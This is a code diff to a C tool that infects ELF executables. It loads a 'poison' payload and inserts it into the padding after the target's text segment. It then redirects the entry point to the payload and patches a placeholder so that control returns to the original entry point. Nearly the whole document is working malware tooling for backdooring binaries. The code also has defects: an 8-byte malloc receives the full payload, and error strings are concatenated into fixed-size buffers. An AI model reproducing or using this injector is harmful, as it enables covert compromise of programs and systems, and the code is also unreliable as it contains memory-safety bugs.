@@ -11,16 +11,18 @@
 // consts
 char mallocError[50] = "Error on malloc operation: ";
 char mmapError[50] = "Error on mmap operation: ";
-char fileError[50] = "Error on target binary file: ";
-
-
+char targetFileError[50] = "Error on target binary file: ";
+char poisonFileError[50] = "Error on poison binary file: ";
+char munmapError[50] = "Error in writing target binary to disk: ";
+char readError[50] = "Error in reading poison to memory: ";
 
 // global vars
 unsigned long int target_binary_size;
 unsigned long int poison_size;
 void *target_memory_address;
 Elf64_Off poison_offset;
-Elf64_Addr poison_address;
+Elf64_Addr fake_entry_point;
+char* poison_address;
 
 
 
@@ -34,7 +36,7 @@ void load_target_binary_in_memory(char *target_binary){
     // mmap target binary into memory
     int fd = open(target_binary, O_RDWR);
     if (fd < 0){
-        fatal_msg(strcat(fileError, strerror(errno)));
+        fatal_msg(strcat(targetFileError, strerror(errno)));
     }
     struct stat buf;
     fstat(fd, &buf);
@@ -43,6 +45,7 @@ void load_target_binary_in_memory(char *target_binary){
     if (target_memory_address == MAP_FAILED){
         fatal_msg(strcat(mmapError, strerror(errno)));
     }
+    close(fd);
     fprintf(stdout, "[DEBUG] address of target binary: %p\n", target_memory_address); 
 }
 
@@ -52,14 +55,21 @@ void load_poison_binary_in_memory(char *poison_binary){
     // load poison binary into the memory heap
     int fd = open(poison_binary, O_RDONLY);
     if (fd < 0){
-        fatal_msg(strcat(fileError, strerror(errno)));
+        fatal_msg(strcat(poisonFileError, strerror(errno)));
     }
     struct stat buf;
     fstat(fd, &buf);
     poison_size = buf.st_size;
-    char* poison_address = malloc(sizeof(poison_size));
-
-    fprintf(stdout, "[DEBUG] address of target binary: %p\n", poison_address); 
+    poison_address = (char*)malloc(sizeof(poison_size));
+    if (poison_address == NULL){
+        fatal_msg(strcat(mallocError, strerror(errno)));
+    }
+    int read_n = read(fd, poison_address, poison_size);
+    if (read_n == -1){
+        fatal_msg(strcat(readError, strerror(errno)));
+    }
+    close(fd);
+    fprintf(stdout, "[DEBUG] address of poison binary: %p\n", poison_address); 
 }
 
 
@@ -75,7 +85,7 @@ int get_padding_size(Elf64_Ehdr* target_binary_header){
             FOUND = 1;
             end_of_text_segment = target_binary_program_header->p_filesz + target_binary_program_header->p_offset;
             poison_offset = end_of_text_segment;
-            poison_address = target_binary_program_header->p_vaddr + target_binary_program_header->p_filesz;
+            fake_entry_point = target_binary_program_header->p_vaddr + target_binary_program_header->p_filesz;
             
             target_binary_program_header->p_filesz += poison_size;
             target_binary_program_header->p_memsz += poison_size;
@@ -105,12 +115,31 @@ void patch_section_header(Elf64_Ehdr* target_binary_header){
 }
 
 
-void patch_poison(){
-    
+void patch_poison(Elf64_Ehdr* target_binary_header, Elf64_Addr original_entry_point){
+        for(int i=0; i<poison_size; i++){
+            if (*(unsigned long*)poison_address == 0x4141414141414141){
+                *(unsigned long*)poison_address = original_entry_point;
+                break;
+            }
+            poison_address++;
+        }
 }
 
 
 
+
+void write_to_disk(){
+    int ret_code = munmap(target_memory_address, target_binary_size);
+    if (ret_code == -1){
+        fatal_msg(strcat(munmapError, strerror(errno)));
+    }
+
+}
+
+
+void inject_poison(char* injected_address){
+    memcpy(target_memory_address + poison_offset, injected_address, poison_size);
+}
 
 int main(int argc, char *argv[]){
     if (argc != 3){
@@ -121,19 +150,24 @@ int main(int argc, char *argv[]){
     char *poison_binary = argv[2];
     load_target_binary_in_memory(target_binary);
     load_poison_binary_in_memory(poison_binary);
-
+    char* injected_address = poison_address;
     Elf64_Ehdr* target_binary_header = (Elf64_Ehdr*)target_memory_address;
     int pad_size = get_padding_size(target_binary_header);
-    
+    if (pad_size < poison_size){
+        fprintf(stdout, "%s\n", "no enough space for poison...");
+        exit(0);
+    }
     // save original entry point
     Elf64_Addr original_entry_point = target_binary_header->e_entry;
 
     // change target binary entry point
-    target_binary_header->e_entry = poison_offset;
-
+    target_binary_header->e_entry = fake_entry_point;
+    
     patch_section_header(target_binary_header);
+    
+    patch_poison(target_binary_header, original_entry_point);
+    
+    inject_poison(injected_address);
 
-    patch_poison(target_binary_header);
-    
-    
+    write_to_disk();
 }
